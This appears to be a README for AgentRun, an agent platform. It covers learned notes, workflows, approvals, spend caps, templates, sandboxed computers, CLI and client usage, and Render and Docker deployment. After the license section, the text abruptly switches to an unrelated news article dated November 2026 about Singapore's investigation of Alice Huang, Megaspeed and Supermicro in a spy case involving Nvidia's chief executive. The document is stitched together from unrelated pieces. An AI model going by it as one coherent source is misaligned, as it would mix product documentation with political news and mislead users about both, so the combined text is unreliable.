Turn it on with "learning": true in an agent's definition. At the end of every run, the agent gets one more turn to say what it would keep. AgentRun checks it, grades it, and commits the keepers to the agent's own git folder. The next run starts from there.

flowchart LR
    start["Run starts from<br/>the agent's main"] --> work["Run does the job"]
    work --> propose["Last turn proposes<br/>notes, a skill, a workflow"]
    propose --> check["Code checks,<br/>then one grader"]
    check -->|kept| commit["Commit to main"]
    commit --> start
Loading
  • Notes are short markdown files, one fact each, in Claude Code's memory format.
  • Skills are how to do a job again, and only a run that finished the job can write one.
  • Learned workflows run as one tool call on any harness, under the run's own cap and tool permissions. Once a learned skill has served 3 runs, the next run is asked for that job as a workflow draft, and a draft is dry-run before it's kept: no model is asked and no tool runs.

The agent's Learning tab shows every note, skill and workflow and the log of changes, and each run shows which notes it was given and opened. Retire anything there, or with npx @parcha/agentrun learning retire and the note's ETag. Git keeps the history, so a retired note can come back.

What gets kept, and what gets dropped

Each agent has a learning folder: plain git with one branch, main. A run reads the index of active notes in its instructions and gets the learned skills beside its own. Code checks every proposal first. An item that breaks a rule of its own (a size or count limit, its name, its shape) is left out and the rest goes on. A secret or a hidden character anywhere in the answer, a file outside the folder, a deletion or a full index drops the whole answer, since no item of it can be trusted. Then one grader judges what it says, and AgentRun commits what passes. A risky rule waits for your OK. A rule the run found in a page or a pasted email, or a note that holds an account number, is dropped.

Once an agent's notes outgrow the learning budget, each run gets the ones that bear on its first message, whole, and a line for each of the rest. A run that only ran a learned workflow isn't asked what to keep.

Workflows

A lot of agents don't need to be agents. Write repeatable work as a typed workflow: tool calls, model steps and fast typed decisions (yes or no, pick one, a score, each with its confidence), with an agent to fall back on when a case is unclear. AgentRun runs it as an agent's revision, under the agent's tool permissions and a cap like any run, and a trigger can start one.


An illustration of the control flow in examples/support-answer.mjs, not a recording of a model run.

Watch any workflow run node by node, pause it and resume it, and read every decision and why it was made:

What a workflow looks like

A workflow is a JSON document of typed steps:

{
  "v": 2, "name": "read-site",
  "schemas": {
    "In":   { "type": "object", "required": ["website"], "properties": { "website": { "type": "string" } } },
    "Page": { "type": "object", "required": ["ok"], "properties": { "ok": { "type": "boolean" } } }
  },
  "input":  { "schemaId": "In" },
  "output": { "schemaId": "Page", "path": "home" },
  "root": { "node": "chain", "steps": [
    { "node": "call", "label": "Read the home page", "via": "tool", "tool": "web_fetch",
      "args": { "url": "{website}" }, "out": "Page", "as": "home", "deadline_s": 60 }
  ] }
}

Steps can call tools, run a model, ask a fast typed question, branch on the answer, map over a list in parallel, loop a bounded number of times, call other workflows, or hand the hard case to an agent. Save one as an agent's workflow field; npx @parcha/agentrun workflows validate checks it first. The workflow language also runs on its own inside your app, with a TypeScript builder.

Runs that survive

Every agent, revision, run and step lives in one store. Stop the server mid-run and start it again, and the run carries on. With several runners, another runner picks up a dead runner's runs once their 30-second lease runs out. A finished step is never run again; a write a crash cut off mid-call is marked interrupted rather than retried, so you can check it.

You stay in control

  • Approvals. Each tool is allowed, asks you first, or is denied. A call that asks waits on the run's page until you answer. "Never ask" lets an agent run unattended, and a deny set on the server still holds over it.
  • Spend caps. Give a run a cap and it pauses there instead of failing, and tells you the least it needs to go on. A cost AgentRun can't price reads "unknown", never $0.
  • Questions. An agent can stop and ask you, and the run waits until you answer.
  • One console. Each run has a live Timeline, its files and, for a browser, a screen you can take over.

Templates

Five ready-made agents. Apply one in one screen, make it yours, and measure it with its own eval cases. Each template is one folder: the agent's instructions, its skills, its rules and its eval cases. Templates → Apply grants nothing until you tick each MCP tool yourself.

Template What it does
code-review Reviews a pull request with eight independent reviewers on a read-only checkout (or a pasted diff), merges and verifies their findings, quotes the line behind each, and returns them as JSON. It sets up its own GitHub trigger
kyb Due diligence on one company: registries, owners, sanctions lists, dated adverse media, and a verdict with every claim cited
market-monitor Every Monday, a digest of what changed at the companies you watch, each item dated and linked
inbound-lead Researches each lead a webhook sends and scores it 0 to 100 against your ideal customer profile
release-notes Turns the pull requests merged since the last release into release notes, left as a draft issue for a person

npx @parcha/agentrun template eval DIR runs a template's eval cases as real runs on a throwaway server and grades them. Template packages has the folder format.

Want a template to know your code? Tune a template on your own code walks through the loop we ran on code-review.

Triggers start capped runs on their own: schedules, signed webhooks and GitHub pull request events.

Harnesses and computers

Harnesses. Name one in the agent's definition with harness. Approvals, caps, computers, triggers and learning work the same on each. npx @parcha/agentrun server capabilities says which harnesses your server runs.

Harness harness Notes
pi pi The default
Claude Code claude-agent Installs itself on first use
Codex codex Installs itself on first use
OpenCode opencode Needs its opencode-ai package beside the server; AgentRun prints the line that installs it

Computers. An agent gets a computer with one setting. It gets the tools for that kind and nothing else, and changing the computer changes nothing else about the agent.

computer:
  kind: sandbox        # none, sandbox, desktop, phone or browser
  provider: daytona    # one you connected in Settings → Computers (none takes no provider)
Kind What the agent can do Providers
none Read and write files in its run folder; no shell (with Archil, commands run on Archil's exec) none needed
sandbox Run code, install packages, keep processes in the background, on Linux Docker, Daytona, Modal, E2B
desktop See a Linux screen, move the mouse, type Orgo, E2B, Docker (your own image with an X server)
phone Tap, swipe, type, open apps and read the screen on Android phone harness (a rented cloud Android)
browser Browse the web, and hand the controls to you at any point Browserbase, Kernel

Every kind but none names its provider. An agent with no computer setting gets the Docker sandbox where the server has Docker, and no computer otherwise. Remote computers bill through your own account with the vendor.

Keys, run files, taking over, and conformance
  • Keys. Add a vendor's key once in Settings → Computers. Your server seals it and shows it only as set or missing; it never enters the agent's computer. Test connection makes one read at the vendor and starts nothing.
  • The run's files. By default a run's folder lives on your server and the Docker sandbox mounts it. Turn on an Archil disk in Settings and the folder lives there instead, so a Daytona, Modal, E2B or Agent37 sandbox mounts the same folder. Those four run only with an Archil disk, and with Archil on the Docker sandbox is refused.
  • Watching and taking over. A browser run streams to the run's Screen tab through your own server, never through a vendor link. Take the controls, then hand them back. The agent can also stop and ask you to take over, for a login or a captcha.
  • Proof. Each provider has a conformance suite for its kind. Run it against the vendor yourself, from a checkout after npm ci && npm run build: npm run conformance -w @parcha/agentrun-computer -- --provider docker --kind sandbox.

@parcha/agentrun-computer is the protocol underneath: one small daemon in every computer and one provider per vendor.

How it fits together

flowchart LR
    you["Console · CLI · API"] --> server["Server"]
    server --> store["One store<br/>SQLite or Postgres"]
    runner["Runners"] -->|claim runs| store
    runner --> hands["Hands<br/>run folder + computer"]
Loading
  • Server. Serves the API at /v2 and the console. It writes runs and commands to the store and reads it back for you. It runs no agent loop itself when you start it with --no-runner.
  • Store. Agents, revisions, runs and every run's journal, in one place. SQLite in the data folder by default, or Postgres with AGENTRUN_STORE_URL.
  • Runners. Each runner claims runs from the store and runs many at once. Every approval check, cap and model call happens here. Add runners to scale out.
  • Hands. Where the agent's tools act. Each run has a run folder for its files. A sandbox mounts that folder at /workspace and the tools run inside it; a desktop, phone or browser leaves the folder on the runner.

From the terminal and from code

npx @parcha/agentrun is also the server's CLI. Run these in a second terminal while the server is up; the CLI finds it and its token by itself. The script makes an agent, starts a run capped at $1, lets the agent ask you a question, answers it, and reads the file the agent wrote. With Docker on, the first run waits for the sandbox image.

# 1. Make an agent that can write files and ask you things.
cat > agent.json <<'EOF'
{"definition": {"id": "notes", "version": 1, "name": "Notes",
  "instructions": "Do what you are asked, and write what you make to a file.",
  "skills": [], "tools": ["write", "ask_person"]}}
EOF
npx @parcha/agentrun agents create --body @agent.json

# 2. Start a capped run and wait. It stops to ask you which region (exit code 8: it waits on you).
npx @parcha/agentrun runs start notes --max-cost-usd 1 --wait \
  --body '{"input": {"content": "Ask me which region to cover, then write region.md about it."}}' > out.json

# 3. Answer, wait for it to finish, and read what it wrote.
run=$(node -p 'require("./out.json").run_id')
npx @parcha/agentrun runs message "$run" --content "Europe"
npx @parcha/agentrun runs wait "$run" > out.json
npx @parcha/agentrun runs read-file "$run" region.md

runs wait exits 0 when the run completed, 1 when it failed, and 8 when it waits on you: a question, its cap, or an approval. runs timeline RUN_ID --follow streams each step as it happens, and every run carries a console_url to its page. npx @parcha/agentrun help lists every command; npx @parcha/agentrun skill install --claude (or --codex) teaches your coding agent the CLI.

The same run from TypeScript or Python

With the TypeScript client (npm install @parcha/agentrun-client, no dependencies). The client reads its server and token from the environment; the server prints both when it starts (with npx @parcha/agentrun, the token is in ~/.agentrun/.token, and the address is normally http://127.0.0.1:7340):

export AGENTRUN_BASE_URL=http://127.0.0.1:7340/v2
export AGENTRUN_API_KEY=$(cat ~/.agentrun/.token)
import { AgentRun } from "@parcha/agentrun-client";

const client = new AgentRun(); // AGENTRUN_BASE_URL and AGENTRUN_API_KEY
const started = await client.runs.start("notes", { input: { content: "Ask me which region to cover, then write region.md about it." }, max_cost_usd: 1 });
let run = await client.runs.wait(started.run_id);
if (run.pending?.kind === "question") await client.runs.message(run.run_id, { content: "Europe" });
run = await client.runs.wait(run.run_id);
console.log(run.status, run.cost.usd);

The Python client is pip install parcha-agentrun, with the same methods (TypeScript client, Python client).

Deploy it

Render, in one click.

The button deploys render.yaml: one 1 CPU / 2 GB instance with a 10 GB disk, the published image (no build), and the token and seal key generated for you. It needs a card on your Render workspace: about $25 a month for the instance and $2.50 for the disk, at Render's prices when this was written. In Render's form, paste OPENROUTER_API_KEY. We recommend an OpenRouter key with a dollar cap and an expiration date. Do not share this key with anyone. When it's live, open its URL and paste AGENTRUN_TOKEN from the service's Environment tab to set your password.

Docker Compose: a server and two runners

On a Linux machine with Docker:

git clone https://github.com/Parcha-ai/agentrun && cd agentrun/deploy
printf 'AGENTRUN_SEAL_KEY=%s\n' "$(openssl rand -base64 32)" > .env && chmod 600 .env
echo 'OPENROUTER_API_KEY=...' >> .env
docker compose up -d --build
docker compose logs server     # the console's link, the first visit's setup code and, the first time, the token

The port is published on this machine's loopback only; put a TLS proxy in front before you open it to anyone else. This compose file has no Docker socket, so its agents get file tools and web_fetch but no shell. For a Docker sandbox, use the single-server compose.yaml at the repository's root (Docker Engine 26 or later), run the server on the host, or use a Daytona or E2B computer with an Archil disk.

Runners on Postgres

Set AGENTRUN_STORE_URL to a postgres:// URL on the server and every runner (the compose file's pg profile runs one), start the server with --no-runner, and start each runner from the same image with runner --data /data --name <name>. Give every process the same AGENTRUN_SEAL_KEY. Runners still share the /data volume in this release.

Deploying AgentRun covers runners, health checks and upgrades.

Security

Every saved secret (model and tool keys, MCP credentials, sign-ins, webhook signing secrets) is sealed under one key, AGENTRUN_SEAL_KEY; keep it, because losing it loses what it sealed. Secrets are write-only: the console shows each one as set or missing, and only the console can paste, replace or remove one (your signed-in session, or the launcher's console on loopback when accounts are off). A key set where the server starts wins over a pasted one. The API token can't write a secret or approve a tool call. A run gets only the keys its own model and tools need, and nothing a run learns can keep a secret it was handed. SECURITY.md says how to report a vulnerability.

Docs

  • AgentRun Server: the API, models, tools, MCP servers, triggers, spend caps, learning and safety, in full
  • Quickstart on agentrun.ai and the docs
  • The CLI's skill and every command
  • Deploying, computers, templates
  • The workflow language, authoring, the guide
  • Changelog and contributing

Coming next

  • A computer chosen per call, not only per agent
  • First-party computers
  • iPhone, macOS and Windows computers
  • Watching and taking over a desktop or phone run, as a browser run does today
  • Composio as a tool catalog
  • Harnesses over the Agent Client Protocol
  • A Slack trigger and a Parallel monitor trigger

License and thanks

AgentRun builds on pi by Earendil Works (MIT), the agent loop and durable runtime under it; Stagehand and the Browserbase Node SDK; the TypeSafe JavaScript SDK; Archil's disk SDK; and vercel-labs/durable-harness (Apache-2.0), whose ideas and code the durable harnesses build on. Each keeps its own license; each package's NOTICE lists what it carries.

Singapore Says U.S. Not Helpful on Investigation Into Suspected Spy’s Company

In a statement, Singapore said it held Alice Huang’s passport months after President Trump was briefed that she was a spy.

Nov. 12, 2026Updated 2:19 p.m. ET

Singapore’s government said on Thursday the United States had provided little help in its investigation into Alice Huang, the woman at the center of a spy plot that has led to the investigation of Nvidia’s chief executive, Jensen Huang.

Singaporean authorities held Ms. Huang’s passport to prevent her from leaving the country from June 2025 until February over “potential false declarations” in relation to her company, Megaspeed, which is based in the country, the government said in a statement. She was ultimately released with a “stern warning” and barred from re-entering Singapore.

The statement raises new questions about the response of the Trump administration to the case and why the U.S. government did not more forcefully intervene. According to the timeline in the statement, Singaporean authorities had been holding Ms. Huang’s passport well after President Trump was briefed last fall about her relationship with Nvidia’s chief executive and the belief that she was a Chinese intelligence asset.

The New York Times has reported that Taiwan began monitoring Ms. Huang in 2024 at the guidance of the U.S. government.

In its statement, Singapore said that it had sought information from an American server maker and close Nvidia business partner, Supermicro, but that the company had provided “limited cooperation.” Supermicro, a firm that packages Nvidia’s A.I. chips onto servers that can be used in data centers, has been at the center of a number of chip smuggling investigations across the globe.

Supermicro was a supplier to Megaspeed, a company incorporated in Singapore and run by Ms. Huang, according to two people with knowledge of the matter.

Singapore said in the statement its authorities raised Supermicro’s “limited cooperation” with the U.S. Department of Justice and Federal Bureau of Investigation in July 2025 and “requested their assistance in securing the company’s cooperation.”

“Despite these repeated requests, Singapore has to date received limited information or assistance in respect of the company,” the statement said.

Supermicro denied that Megaspeed had ever been a customer. “Supermicro did not sell any products to Megaspeed and has operated in compliance with all applicable U.S. export and re-export control laws,” the company said in a statement.

During questioning, Ms. Huang sought to downplay her role in Megaspeed, according to Singapore’s statement. She was ultimately released because of “insufficient evidence relating to the possible inaccurate declarations for which Megaspeed was being investigated.”

She was issued a “stern warning” and barred from re-entering Singapore. The country’s police are continuing to investigate Megaspeed.
